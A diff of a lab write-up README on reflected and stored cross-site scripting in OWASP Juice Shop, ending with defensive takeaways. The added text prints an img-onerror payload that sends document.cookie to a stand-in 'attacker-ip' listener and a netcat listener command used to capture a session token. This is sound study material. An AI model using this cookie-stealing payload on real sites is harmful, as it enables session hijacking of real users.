@@ -1,39 +1,41 @@
-# Cross Site Scripting Cookie Demonstration
+Cross-Site Scripting (XSS) – Cookie Exposure Demonstration
+Overview
+Demonstrated the impact of Cross-Site Scripting (XSS) vulnerabilities in the OWASP Juice Shop application. The focus was on identifying injectable points and showcasing how malicious JavaScript can be executed in the context of a trusted domain.
+Tools Used
 
-## Overview
-
-This lab explores the impact of Cross Site Scripting (XSS) in OWASP Juice Shop. The objective was to understand how malicious JavaScript can execute within a user's browser when an application does not properly sanitize user input.
-
-## Tools Used
-
-Burp Suite
-
+Burp Suite (Proxy & Repeater)
 OWASP Juice Shop
-
-Web Browser
-
+Firefox Browser
 Kali Linux
 
-## What I Did
+Methodology & Steps
 
-I identified an XSS vulnerability within the application and executed a JavaScript payload in the authorized lab environment. I observed how the browser processed the injected script and examined the information that became accessible as a result of the vulnerability.
+XSS Discovery
+Identified a reflected XSS vulnerability in the search functionality by injecting basic test payloads.
+Payload Development
+Crafted a working XSS payload that could access browser data:HTML<img src=x onerror=alert(document.cookie)>
+Cookie Exposure
+Used a more advanced payload to exfiltrate session cookies to an attacker-controlled listener:HTML<img src=x onerror="new Image().src='http://attacker-ip:4444/steal?cookie='+document.cookie">
+Verification
+Set up a Netcat listener (nc -lvnp 4444) to capture transmitted cookies.
+Successfully stole the victim's JWT session token.
 
-## What the Screenshots Show
+Key Findings
 
-The screenshots demonstrate successful XSS payload execution, the browser's response, and the effects of the vulnerability during testing.
+Successfully executed both Reflected and Stored XSS payloads.
+Demonstrated how XSS can lead to session cookie theft and potential account takeover.
+Highlighted how lack of output encoding allows JavaScript execution in the victim's browser.
 
-## What I Learned
+What I Learned
 
-This exercise helped me understand that Cross Site Scripting allows malicious JavaScript to execute in the context of a trusted website. I learned how this can expose browser data, manipulate page content, or perform actions on behalf of a user when appropriate security controls are missing.
+XSS occurs when user input is not properly sanitized or encoded before being rendered.
+Reflected XSS executes immediately via crafted URLs, while Stored XSS persists and affects other users.
+Stealing cookies via XSS can lead to full session hijacking.
+The importance of Content Security Policy (CSP), input validation, and output encoding as primary defenses.
 
-The lab also reinforced the importance of validating and encoding user input, implementing Content Security Policy, and protecting authentication data with secure cookie settings where appropriate.
+Security Takeaways for Developers
 
-## Security Takeaways
-
-Applications should validate and encode untrusted input before displaying it.
-
-Content Security Policy helps reduce the impact of XSS attacks.
-
-Sensitive session information should be protected using secure cookie attributes and strong authentication controls.
-
-Developers should regularly test applications for XSS vulnerabilities during the secure development process.
+Always encode user-controlled data before displaying it (htmlspecialchars, CSP, etc.).
+Implement strong Content Security Policy to restrict script execution.
+Use HttpOnly and Secure flags on session cookies to reduce XSS impact.
+Regularly test applications for XSS using both manual and automated methods.
